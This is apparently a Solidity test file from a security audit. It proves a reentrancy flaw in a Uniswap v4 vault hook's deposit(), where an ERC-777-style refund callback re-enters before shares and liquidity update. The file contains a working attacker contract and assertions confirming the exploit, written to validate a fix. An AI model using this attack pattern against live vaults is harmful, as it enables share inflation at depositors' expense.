// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/**
 * @title ReentrancyFinding1Test
 *
 * Validates Finding #1 from the consolidated security audit:
 * "Reentrancy in deposit() — CEI violation enables share inflation via refund hook"
 *
 * VULNERABILITY:
 *   deposit() sends unused-token refunds (Step 5) BEFORE updating totalLiquidity
 *   and minting shares (Step 6). An ERC-777 `tokensReceived` callback on the
 *   refund transfer can re-enter deposit() while the outer call's state updates
 *   have not yet executed.
 *
 * ATTACK TIMELINE:
 *   1. attacker.attack()  →  hook.deposit(2:1 excess of callbackToken)
 *   2. Step 3: liquidity added to pool  ← totalLiquidity NOT yet updated
 *   3. Step 5: refund callbackToken to attacker  ← fires onTokenTransfer callback
 *   4. onTokenTransfer  →  re-enters hook.deposit(1:1)  ← stale totalLiquidity/supply
 *   5. re-entrant deposit() completes (no guard blocks it)
 *   6. outer deposit() resumes at Step 6, computes shares against already-modified state
 *
 * EXPECTED AFTER FIX:
 *   With `nonReentrant` on deposit(), the re-entrant call reverts and
 *   attacker.reentrancyOccurred stays false.
 *
 * CURRENT STATE (bug present):
 *   attacker.reentrancyOccurred == true — re-entry succeeds with no revert.
 */

import "forge-std/Test.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {Deployers} from "v4-core/test/utils/Deployers.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {CuratedVaultHook} from "../src/CuratedVaultHook.sol";
import {VaultShares} from "../src/VaultShares.sol";

// ─────────────────────────────────────────────────────────────────────────────
//  CallbackERC20 — simulates ERC-777 tokensReceived hook
// ─────────────────────────────────────────────────────────────────────────────

interface ITokenReceiver {
    function onTokenTransfer(address from, uint256 amount) external;
}

/// @dev Minimal ERC-20 that fires ITokenReceiver.onTokenTransfer on the recipient
///      during every transfer() when the recipient is a contract.
///      Reverts from the callback propagate — no try/catch.
///      This is exactly what ERC-777's tokensReceived hook enables in practice.
contract CallbackERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        return _transfer(from, to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        // ERC-777-style hook: notify the recipient if it is a contract.
        // Uses try/catch so contracts that don't implement ITokenReceiver don't break
        // normal transfers (e.g. the hook itself receiving tokens in Step 1).
        // NOTE: if onTokenTransfer internally reverts (e.g. re-entry blocked by nonReentrant),
        // the entire onTokenTransfer call frame reverts — including any state it set —
        // which is caught here, so the outer transfer succeeds but reentrancyOccurred stays false.
        if (to.code.length > 0) {
            try ITokenReceiver(to).onTokenTransfer(from, amount) {} catch {}
        }
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  ReentrancyAttacker — re-enters deposit() from within the refund callback
// ─────────────────────────────────────────────────────────────────────────────

contract ReentrancyAttacker is ITokenReceiver {
    CuratedVaultHook public immutable hook;
    address public immutable callbackToken;
    address public immutable stableToken;

    bool private _active;

    // Set to true if the re-entrant deposit() call completed without reverting
    bool public reentrancyOccurred;

    // State snapshots taken at the moment of re-entry (before Step 6 of outer deposit)
    uint256 public totalSupplyAtReentry;
    uint256 public totalLiquidityAtReentry;

    constructor(address _hook, address _cbToken, address _stableToken) {
        hook = CuratedVaultHook(_hook);
        callbackToken = _cbToken;
        stableToken = _stableToken;
    }

    function approveHook() external {
        CallbackERC20(callbackToken).approve(address(hook), type(uint256).max);
        MockERC20(stableToken).approve(address(hook), type(uint256).max);
    }

    /// @dev Launch the attack.
    ///      Deposits 2:1 excess of the callback token so that Step 5 must
    ///      refund the excess back to this contract, triggering onTokenTransfer.
    function attack() external {
        _active = true;
        (Currency c0,,,, ) = hook.poolKey();
        bool cbIsCurrency0 = address(callbackToken) == Currency.unwrap(c0);
        // Deposit 2x the callbackToken and 1x stable — the excess ensures a refund
        if (cbIsCurrency0) {
            hook.deposit(2 ether, 1 ether, 0, 0);
        } else {
            hook.deposit(1 ether, 2 ether, 0, 0);
        }
        _active = false;
    }

    /// @dev Called by CallbackERC20 when this contract receives the Step-5 refund.
    ///      The outer deposit() is suspended between Step 5 and Step 6:
    ///        - Liquidity has been added to the pool (Step 3 done)
    ///        - BUT totalLiquidity has NOT been updated (Step 6 not yet run)
    ///        - AND vaultShares have NOT been minted  (Step 6 not yet run)
    function onTokenTransfer(address, uint256) external override {
        if (_active && !reentrancyOccurred) {
            reentrancyOccurred = true;

            // Snapshot the stale state we observe at re-entry
            totalSupplyAtReentry    = hook.vaultShares().totalSupply();
            totalLiquidityAtReentry = uint256(hook.totalLiquidity());

            // Re-enter deposit() with equal amounts (no excess → minimal refund → no recursion)
            hook.deposit(1 ether, 1 ether, 0, 0);
        }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  Test
// ─────────────────────────────────────────────────────────────────────────────

contract ReentrancyFinding1Test is Test, Deployers {
    using PoolIdLibrary for PoolKey;

    CuratedVaultHook hook;
    VaultShares vaultShares;
    PoolKey hookKey;

    CallbackERC20 cbToken;   // ERC-777-like token — the attack vector
    MockERC20 stableToken;   // normal ERC-20

    ReentrancyAttacker attacker;
    address alice = makeAddr("alice");

    function setUp() public {
        deployFreshManagerAndRouters();

        // Deploy tokens
        cbToken     = new CallbackERC20("CallbackToken", "CBT");
        stableToken = new MockERC20("StableToken", "STB", 18);

        // Uniswap v4 requires currency0 < currency1 by address
        (Currency currency0, Currency currency1) = address(cbToken) < address(stableToken)
            ? (Currency.wrap(address(cbToken)), Currency.wrap(address(stableToken)))
            : (Currency.wrap(address(stableToken)), Currency.wrap(address(cbToken)));

        // Deploy hook at the flags address (test-only trick to skip address mining)
        uint160 flags = uint160(
            Hooks.AFTER_INITIALIZE_FLAG      |
            Hooks.BEFORE_ADD_LIQUIDITY_FLAG  |
            Hooks.BEFORE_REMOVE_LIQUIDITY_FLAG |
            Hooks.BEFORE_SWAP_FLAG           |
            Hooks.AFTER_SWAP_FLAG
        );
        deployCodeTo("CuratedVaultHook.sol", abi.encode(manager), address(flags));
        hook       = CuratedVaultHook(address(flags));
        vaultShares = hook.vaultShares();

        // Initialize pool at 1:1 price
        hookKey = PoolKey({
            currency0:   currency0,
            currency1:   currency1,
            fee:         0x800000, // DYNAMIC_FEE_FLAG
            tickSpacing: 60,
            hooks:       IHooks(address(hook))
        });
        manager.initialize(hookKey, TickMath.getSqrtPriceAtTick(0));

        // Fund Alice (legitimate depositor)
        cbToken.mint(alice, 100 ether);
        stableToken.mint(alice, 100 ether);
        vm.startPrank(alice);
        cbToken.approve(address(hook), type(uint256).max);
        stableToken.approve(address(hook), type(uint256).max);
        vm.stopPrank();

        // Deploy and fund attacker
        attacker = new ReentrancyAttacker(address(hook), address(cbToken), address(stableToken));
        cbToken.mint(address(attacker), 100 ether);
        stableToken.mint(address(attacker), 100 ether);
        attacker.approveHook();
    }

    // ─── Test 1: Prove the bug — reentrancy is NOT blocked ───────────────────

    /// @notice PASSES when bug is present. FAILS after the nonReentrant fix is applied.
    ///
    ///         Demonstrates that deposit() can be re-entered mid-execution via an
    ///         ERC-777 tokensReceived callback on the Step-5 refund transfer.
    ///         There is currently no reentrancy guard preventing this.
    function test_reentrancy_bugExists_reentrantDepositSucceeds() public {
        // Alice deposits first to establish vault state (non-zero totalLiquidity + supply)
        vm.prank(alice);
        hook.deposit(5 ether, 5 ether, 0, 0);

        uint256 liquidityBefore = hook.totalLiquidity();
        uint256 supplyBefore    = vaultShares.totalSupply();

        // Attacker deposits with 2:1 excess of the ERC-777-like callbackToken.
        // Step 5 refunds the excess → fires onTokenTransfer → re-enters deposit().
        // Without a nonReentrant guard, the re-entrant call completes successfully.
        attacker.attack();

        // ── Primary assertion: reentrancy was not blocked ──────────────────
        assertTrue(
            attacker.reentrancyOccurred(),
            "VULNERABILITY CONFIRMED: deposit() has no nonReentrant guard - re-entry succeeded"
        );

        // ── Secondary: stale state was visible at re-entry ─────────────────
        // At the point of re-entry, Step 6 of the outer deposit had NOT run.
        // Neither totalLiquidity nor totalSupply had been updated for the outer deposit.
        assertEq(
            attacker.totalLiquidityAtReentry(),
            liquidityBefore,
            "totalLiquidity was stale at re-entry: outer Step 6 had not yet executed"
        );
        assertEq(
            attacker.totalSupplyAtReentry(),
            supplyBefore,
            "totalSupply was stale at re-entry: vaultShares.mint had not yet executed"
        );

        // ── Tertiary: attacker received shares from both calls ─────────────
        assertGt(
            vaultShares.balanceOf(address(attacker)),
            0,
            "Attacker holds shares from successful re-entrant + outer deposits"
        );
    }

    // ─── Test 2: Stale state window — documents the CEI violation ────────────

    /// @notice Documents exactly which state is stale at the point of re-entry.
    ///         The outer deposit has already added liquidity to the PoolManager (Step 3)
    ///         but totalLiquidity has NOT been updated (Step 6 pending).
    ///         This mismatch is the root cause of the share-inflation risk.
    function test_reentrancy_staleTotalLiquidityWindowExists() public {
        vm.prank(alice);
        hook.deposit(10 ether, 10 ether, 0, 0);

        uint256 liquidityBefore = hook.totalLiquidity();

        attacker.attack();

        // The attacker observed totalLiquidity == liquidityBefore at re-entry,
        // even though the outer deposit had already committed liquidity to the pool.
        // This is the CEI violation: state was not updated before the external call.
        assertEq(
            attacker.totalLiquidityAtReentry(),
            liquidityBefore,
            "CEI violation: totalLiquidity was not updated before external refund transfer"
        );
    }
}
